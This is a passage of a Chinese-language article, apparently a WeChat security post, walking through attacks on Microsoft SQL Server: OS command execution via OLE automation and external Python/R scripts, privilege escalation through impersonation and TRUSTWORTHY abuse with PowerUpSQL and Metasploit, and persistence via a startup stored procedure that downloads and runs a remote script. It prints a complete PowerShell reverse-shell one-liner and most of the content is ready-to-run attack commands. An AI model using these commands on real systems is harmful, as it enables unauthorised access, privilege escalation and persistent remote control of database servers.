https://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit

```

**使用 SP_OACREATE 执行命令**

OLE 代表对象链接和嵌入。Microsoft 开发这项技术是为了让应用程序更轻松地共享数据。因此，自动化使应用程序能够操纵在其他应用程序中实现的对象。该自动化服务器通过 COM 接口展示其功能；对于不同的应用程序来读取它们，它进一步帮助它们通过检索对象和使用其服务来自动化其属性。  

### **开启 OLE 自动化**

查询是否开启

```
EXEC sp_configure 'Ole Automation Procedures'; 
GO

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc48cv5F2icQMCfeMjgsnzIb801UN5xncQncPBZL0RLb9leHmL7h8yfKw/640?wx_fmt=png&from=appmsg)

开启 OLE 自动化

```
sp_configure 'show advanced options', 1; 
GO 
RECONFIGURE; 
GO 
sp_configure 'Ole Automation Procedures', 1; 
GO 
RECONFIGURE; 
GO

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcvF6DOybHJLQ7lAZDhc0PSCj8qEMjoOicX2QYCKBSEnfUSf5Fz6caRFg/640?wx_fmt=png&from=appmsg)

执行命令，利用这种方式执行命令没用回显，只能输出到文件中

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c whoami /all > C:\\Users\\Administrator\\Desktop\\1.txt';

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYca68f7ytCtCaAhibtTpGaWR0XOSkcu6KI2LNibecia6VrBgibLS27UVYoBQ/640?wx_fmt=png&from=appmsg)

### **使用 PowerUpSQL 执行**

```
powershell
powershell -ep bypass
Invoke-SQLOSCmdOle -Username sa -Password admin -Instance "192.168.3.130,1433" -Command "whoami /all" -Verbose

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcLMofaDdLMFhicEw7LEfLCV3BTOA1emoYo1nTxHX3w8Z70DUgfzFMIKA/640?wx_fmt=png&from=appmsg)

**用户权限提升之模拟**

MSSQL Impersonate 命令是一种根据其他用户名进行身份验证以执行系统查询的方法。为此，它通常与 CREATE USER 语句结合使用。当您使用模拟帐户时，SQL Server 会检查是否拥有查询引用的所有数据库的权限。

### **开启用户模拟**

新建一个低权限用户

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcUadq9JP0CQiaghG1f8GzbsWibrKou3ZygdRzSNm3mShjRx23wwXe6iclg/640?wx_fmt=png&from=appmsg)

右键登录名，点击属性，添加特定对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcV96cNicpI6qfWVUreukfD439uqF57AnnKMjibjdvWBbfGJJKf9IgWsbQ/640?wx_fmt=png&from=appmsg)

选择对象类型为登录名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcO55DoDicspJLiarVoPdgjicPRiaqaJNOZAvx4vq5YE26l5RibWgtLCzOMlA/640?wx_fmt=png&from=appmsg)

浏览对象，选择 sa

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcibFKVWATtcNPnd88sPibEm2u8kFTcq9yMow8157hDiaFM2urF5XLlQZEg/640?wx_fmt=png&from=appmsg)

授予模拟权限。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcJ2hv3CecalHpl2Xpdt8eXvfw1S5liaUwzw5qrc50IaibYic74fxUvxggw/640?wx_fmt=png&from=appmsg)

使用 msf 执行命令即可成功提权

```
use auxiliary/admin/mssql/mssql_escalate_execute_as
set rhosts 192.168.3.130
set username lowpriv
set password admin
exploit

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcyibOPMic6dhwv5hPejhfwmB446EIn2scPJeOlZich3Tl5NWfCQzVBCvPA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcWBy6tkpLoHDnibGroeEQianbSUiaWpeIicRmrxvaiaT9S8DCia84YdUdot0w/640?wx_fmt=png&from=appmsg)

**使用外部脚本执行命令**

sqlserver 2019 增添了许多新功能，安装时选择 “机器学习服务和语言”，需要选中 R、Python、Java 复选框。

检查外部脚本是否启用  

```
sp_configure 'external scripts enabled'
GO

```

启动外部脚本  

```
EXECUTE sp_configure 'external scripts enabled', 1;
GO
RECONFIGURE;
GO

```

### **执行 python 命令**

```
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("ipconfig"))'

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcnNWEfX3zSDwKicsYLZgt7lzmRodAw7JddiahWP9MPRp3tKRFj8Dib2glg/640?wx_fmt=png&from=appmsg)

### **执行 R 脚本**

```
EXEC sp_execute_external_script
@language=N'R',
@script=N'OutputDataSet <- data.frame(system("cmd.exe /c ipconfig",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcYFmfFFiapybpA97ASUVLYXrdibrmmXMRDV4NnAsSTia35hvgADdcjvP7A/640?wx_fmt=png&from=appmsg)

**滥用 Trustworthy（db_owner 提权）**

**手动提权**  

创建 public 用户权限 test

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcsRDXJibNITlsxslo6Jq68DuFXH0mhEp0fUykcEf3e2pvuRjRx4LP2icg/640?wx_fmt=png&from=appmsg)

新建数据库 ignite

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcsdNNpCnXdM2stOr2JKoPqrbXltziaIae5WsSyQ0qmv3iaFOBkFjK7ictA/640?wx_fmt=png&from=appmsg)

编辑 test 用户的用户映射，使其拥有 ignite 数据库的 db_owner 身份

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcGVgbibGmeCXzPcQrELiaSG8Vj783ibZgEiaOIdaW9JlJCIUvL4eH7Ceiblg/640?wx_fmt=png&from=appmsg)

检查数据库是否启用了可信属性

```
select name,is_trustworthy_on from sys.databases

```

可以看到 ignite 数据库暂未开启  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcLibD4V9mLicSCG8sYKC8ZQmp7n1ibicpY3H0WfLeC1StgWkuD6rNQR40pw/640?wx_fmt=png&from=appmsg)

激活其可信属性

```
ALTER DATABASE [ignite] SET TRUSTWORTHY ON

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcqwVYEQYES9XYb1U3lehbwwHsI9fg2lAcL02fAVcsSEKkMzZsoJYLHA/640?wx_fmt=png&from=appmsg)

使用创建的 test 用户登录，在 ignite 数据库中新建查询哪些用户是其 db_owner

```
use ignite;
SELECT DP1.name AS DatabaseRoleName,  
    isnull (DP2.name, 'No members') AS DatabaseUserName  
FROM sys.database_role_members AS DRM 
RIGHT OUTER JOIN sys.database_principals AS DP1 
    ON DRM.role_principal_id = DP1.principal_id 
LEFT OUTER JOIN sys.database_principals AS DP2 
    ON DRM.member_principal_id = DP2.principal_id 
WHERE DP1.type = 'R'
ORDER BY DP1.name;

```

可以看到已经存在 test 用户  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc1KgV6xpB71fHC3yFdvzficDlaDLfdnAXyC4XdGUbY1LLpaFubQksFow/640?wx_fmt=png&from=appmsg)

由于 test 和 dbo 用户都是数据库的所有者，我们现在可以通过 test 来模拟 dbo 用户，一旦伪装成功，就能进一步获取权限。

```
EXECUTE AS USER = 'dbo';
SELECT system_user;

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcoLd5ZQbpcdFKibS1SaDdvYyhJZM5EmqJVbCXicq3UXJZghtQuqVDIMMg/640?wx_fmt=png&from=appmsg)

上述查询已成功执行。现在，我们将借助以下查询将 raj 用户设置为 sysadmin，从而为它获得更多权限

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc1foQs2HE7G0ia3Oy96QFD4SmkicNWvDNMHumG7ocxO1Rs4hc4aziagBJg/640?wx_fmt=png&from=appmsg)

可以看到 test 用户的属性已经被设置为 admin

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc7ibvjlPOCibeR5Y02wUicokGHQvg8a2bncHI3qdfKJkqfxrMGq4GR0MKQ/640?wx_fmt=png&from=appmsg)

### **使用 PowerUpSQL 提升权限**

首先查看可信权限是否被激活

```
Import-Module .\PowerUpSQL.ps1
Invoke-SQLAuditPrivTrustworthy -Username test -Password admin -Instance '192.168.3.137,1433' -Verbose

```

可以看到可信权限已经被打开  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYc2FqYQDq9wUMh3XRLJnEicskqczrXpWaiap9DrP4BgGNvfzCAUhYPuMcA/640?wx_fmt=png&from=appmsg)

```
Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
Invoke-SqlServer-Escalate-DbOwner -SqlUser raj -SqlPass Password@1 -SqlServerInstance WIN-P83OS778EQK\SQLEXPRESS

```

调用 Powershellery 项目的 SqlServer-Escalate-DbOwner 模块提升权限  

```
https://github.com/nullbind/Powershellery/

```

```
Import-Module .\Invoke-SqlServer-Escalate-Dbowner.psm1
Invoke-SqlServer-Escalate-DbOwner -SqlUser test -SqlPass admin -SqlServerInstance '192.168.3.137,1433'

```

成功升级为 sysadmin 权限  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcX7NOL6cxQjq492XXFYhy715LKgtibT8YiaTGIwf3l6SZvLnkvUUSCQGw/640?wx_fmt=png&from=appmsg)

也可使用 msf 中的模块提升权限，这里不再赘述。

**使用存储过程进行权限维持**

使用 matser 数据库  

```
USE master
GO

```

这里假设 xp_cmdshell 已被开启，选择使用 nishang 中的 Invoke-PowerShellTcpOneLine.ps1 脚本进行反弹 shell  

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.3.130",6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

创建存储过程 powershell 远程调用脚本  

```
CREATE PROCEDURE test_sp
AS
EXEC master..xp_cmdshell 'powershell -C "iex (new-object System.Net.WebClient).DownloadString(\"http://192.168.3.133:8081/Invoke-PowerShellTcpOneLine.ps1\")"'
GO

```

我们现在将此存储过程移至启动阶段，因为我们希望它在服务器启动后立即执行  

```
EXEC sp_procoption @ProcName = 'test_sp'
, @OptionName = 'startup'
, @OptionValue = 'on';

```

查询启动中拥有的存储过程，已经添加成功  

```
SELECT * FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1;

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcec6VXIial78ia7yPKo9m5OphyCCcd1RUPzXFYbnCoibWTT1NIeWb5icgibA/640?wx_fmt=png&from=appmsg)

将 sqlserver 服务重新启动，成功反弹 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcd4FibOsmI7f4tCwfX8HicAcnug4J8kuJicxw2PEITG81cHFpK6W89fGFg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOe9wHsqf53AxeFoG1HQncYcZmS6hjWabbJ8fWy2cmYJChmDcbTsibKcnMtw49Vn8CzWKwjhFrxXvKg/640?wx_fmt=png&from=appmsg)

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片开始学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**知 识 星 球**

  

  

仅前 1-400 名: 99¥，400-600 名: 128¥，600-800 名: 148¥，800-1000 + 名: 168¥

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOcKGNyJ8jSPNpMahribWIY2cut8eAiakTpr6lAzlLt1xubcuUg4la0LMHmhnENia4icnjOwTsfDqq4I7A/640?wx_fmt=png&from=appmsg)

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0H2aiaR0OwyR63JAI1pRGAc7FZMgIHb9kicboQziaJkTbnlAgOvkdiaHf5g/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247499188&idx=1&sn=9ce15a0e66b2595285e544aaa0c49c24&chksm=cfa559a7f8d2d0b162f00e0c1b02c85219f2668c282b32967b2530f15051b47b21ee2855a783&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0ibIORUp7SmHhzy2uyXKsgn7YwfdjIpZDFx0vT7AJDMtqKf9l5WCzIIQ/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247496043&idx=1&sn=4daa27ade9915de6021fea1c2a21d7bc&chksm=cfa55578f8d2dc6ef887ce27215f942ec233320fa6878bc1666ce0fecb0e7f6c7f96a3ba4e2b&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdAPjIVeN2ZahG9ibP0Y3wlfg6BO1WO7MZfo1JeW7zDWcLSTQ5Ek8zXAia5w1nMnogpbpXP6OxXXOicA/640?wx_fmt=png)